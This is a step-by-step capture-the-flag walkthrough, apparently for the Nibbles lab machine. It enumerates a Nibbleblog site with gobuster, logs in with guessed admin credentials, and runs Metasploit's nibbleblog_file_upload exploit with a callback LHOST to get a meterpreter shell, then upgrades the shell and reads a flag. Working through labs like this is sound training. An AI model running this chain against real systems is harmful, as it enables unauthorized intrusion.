### Gain a foothold on the target and submit the user.txt flag

1.paste the attacker ip into the virtual machines browser
2.open the inspector tool
3.notice that he is using the nibbleblog framework in the console
4.run gobuster in the terminal gobuster dir -u http://10.129.59.251/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50 -q
5.look at the /admin url http://10.129.64.19/nibbleblog/admin/ that is found
6.find the credentials
7.the username is admin the password is nibbles, i found those by guessing
8.go to http://10.129.64.19/nibbleblog/admin.php
9.sign in
10.go to http://10.129.64.19/nibbleblog/README
11.look at the version of nibbleblog
12.search for a public exploit for this specific version
13.you can do so by using the searchsploit command
14.searchsploit "Nibbleblog 4.0.3"
15.Launches Metasploit's console to begin attack
16.enter commands one by one inside msfconsole.
17.msfconsole -q
18.use exploit/multi/http/nibbleblog_file_upload
19.set LHOST 10.129.65.90
20.set USERNAME admin
21.set PASSWORD nibbles
22.set RHOSTS 10.129.211.176
23.set TARGETURI /nibbleblog/
24.exploit
25.now leave meterpreter(your backdoor into the hacked machine) and go to a basic shell on the target machine
26.you can upgrade the shell by running this command python3 -c 'import pty;pty.spawn("/bin/bash")'
27.Fix the terminal display without it the terminal might behave weird
28.run this command to fix display export TERM=xterm
29.last step is to read their flag cat /home/nibbler/user.txt